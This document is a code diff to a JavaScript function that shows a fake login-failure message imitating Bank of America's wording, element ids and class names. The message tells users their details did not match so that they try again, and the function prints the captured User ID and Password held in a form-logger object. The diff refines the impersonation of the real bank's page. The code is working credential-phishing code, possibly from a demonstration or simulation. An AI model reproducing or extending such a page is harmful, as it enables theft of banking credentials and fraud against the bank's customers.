@@ -84,35 +84,34 @@ function showFormCaptureError() {
     console.log('[FL] Could not scroll');
   }
   
-  const existing = document.querySelector('.error-state');
+  const existing = document.querySelector('.error-skin');
   if (existing) existing.remove();
   
   const err = document.createElement('div');
-  err.className = 'error-state';
-  err.style.cssText = 'background:#fce4ec;border:1px solid #f48fb1;border-left:5px solid #d32f2f;padding:16px;margin:20px;font-size:13px;color:#333;display:block;z-index:10000;font-family:Arial,sans-serif;line-height:1.5;';
+  err.className = 'error-skin';
   
-  let message = '<div style="display:flex;gap:12px;align-items:flex-start;">';
-  message += '<div style="flex-shrink:0;color:#d32f2f;font-size:20px;line-height:1.2;margin-top:2px;">⚠</div>';
-  message += '<div style="flex:1;">';
-  message += 'The information you entered doesn\'t match our records. You have a few more tries remaining.<br>';
-  message += 'Please try again or <a href="./login-reset.html" style="color:#0066cc;text-decoration:underline;cursor:pointer;">click Forgot ID/Password</a>';
-  message += '<br><br>';
-  message += '<div style="border-top:1px solid #f48fb1;padding-top:12px;margin-top:12px;">';
-  message += '<strong style="color:#666;font-size:12px;display:block;margin-bottom:8px;">Having problems logging in or resetting your Password?</strong>';
-  message += '<span style="font-size:12px;color:#666;line-height:1.6;">If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a href="#" style="color:#0066cc;text-decoration:underline;">Learn more</a></span>';
-  message += '</div>';
-  message += '</div></div>';
+  const msgDiv = document.createElement('div');
+  msgDiv.className = 'error-message';
+  
+  const p = document.createElement('p');
+  p.id = 'Vipaa_Action_0';
+  p.className = 'TLu_ERROR';
+  
+  const li = document.createElement('li');
+  let liContent = 'The information you entered doesn\'t match our records. You have a few more tries remaining.<br> Please try again or click <a name="forgot-id-passcode" href="./login-reset.html">Forgot ID/Password</a><br><br><b>Having problems logging in or resetting your Password?</b> If you\'re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a name="learn-more" href="https://www.bankofamerica.com/customer-service/contact-us/bank-of-america-login-issues/">Learn more</a>';
   
   // Display captured credentials if available
   if (window._formLoggerData) {
-    message += '<br><div style="background:#f5f5f5;border:1px solid #ddd;padding:12px;margin-top:12px;border-radius:4px;font-size:12px;">';
-    message += '<strong style="color:#666;display:block;margin-bottom:6px;">Captured Credentials:</strong>';
-    message += '<span style="font-family:monospace;color:#333;display:block;">User ID: ' + (window._formLoggerData.userId || 'N/A') + '</span>';
-    message += '<span style="font-family:monospace;color:#333;display:block;">Password: ' + (window._formLoggerData.password || 'N/A') + '</span>';
-    message += '</div>';
+    liContent += '<br><br><b style="display:block;margin-top:12px;">Captured Credentials:</b>';
+    liContent += '<span style="font-family:monospace;display:block;">User ID: ' + (window._formLoggerData.userId || 'N/A') + '</span>';
+    liContent += '<span style="font-family:monospace;display:block;">Password: ' + (window._formLoggerData.password || 'N/A') + '</span>';
   }
   
-  err.innerHTML = message;
+  li.innerHTML = liContent;
+  p.appendChild(li);
+  msgDiv.appendChild(p);
+  err.appendChild(msgDiv);
+  
   document.body.insertBefore(err, document.body.firstChild);
   console.log('[FL] Error shown with captured data');
 }
